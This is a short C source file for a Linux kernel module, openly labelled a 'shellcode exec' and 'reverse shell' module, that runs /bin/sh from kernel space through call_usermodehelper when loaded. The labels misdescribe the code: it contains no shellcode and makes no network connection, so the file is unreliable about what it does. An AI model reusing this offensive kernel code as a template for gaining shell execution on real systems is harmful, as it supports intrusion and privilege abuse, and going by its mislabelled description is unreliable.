#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/unistd.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cocomelonc");
MODULE_DESCRIPTION("shellcode exec kernel module");

static int __init reverse_shell_init(void) {
  // run shell
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};

  printk(KERN_INFO "Starting reverse shell...\n");

  // execve from user space
  call_usermodehelper("/bin/sh", argv, envp, UMH_WAIT_PROC);

  return 0;
}

static void __exit reverse_shell_exit(void) {
  printk(KERN_INFO "Reverse shell module unloaded\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
